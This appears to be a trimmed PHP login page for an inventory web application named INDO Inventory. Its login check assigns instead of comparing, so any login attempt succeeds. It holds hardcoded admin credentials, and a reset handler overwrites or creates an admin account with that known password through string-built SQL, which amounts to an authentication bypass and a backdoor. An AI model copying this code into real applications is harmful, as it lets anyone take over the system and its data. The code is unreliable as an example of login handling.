  ...
  <body class="hold-transition login-page">
    ...
    if (isset($_POST['login'])) {
      if ($_SERVER["REQUEST_METHOD"] == "POST") {
        ...
        if ($username = "bunda_betty2025" && $password = "coffe_patani25") {
          //    $data=mysqli_fetch_assoc($hasil);
          $_SESSION['username'] = $username;
          $_SESSION['nama'] = "bunda_betty2025";
    ...
    if (isset($_POST['reset'])) {
      if ($_SERVER["REQUEST_METHOD"] == "POST") {
        ...
        $password = "coffe_patani25";
        $user = "bunda_betty2025";

        $sql = "SELECT * from user where username='$user'";
        $result = mysqli_query($conn, $sql);
        if (mysqli_num_rows($result) > 0) {
          $updt = "UPDATE user SET password='$password', jabatan='$user' where username='$user' ";
          ...
          $sql2 = "insert into user values( '$user','$password','bunda_betty2025','abcd bandung','08123456789','2000-05-01','2025-05-27','admin','dist/upload/index.jpg','')";
      ...
      <div id="loginbox" style="margin-top:50px;" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
        ...
        <div class="login-box">
          <div class="login-logo">
            <a href="">
              <font color="white"><b>INDO</b>Inventory
            </a></font>
          </div>
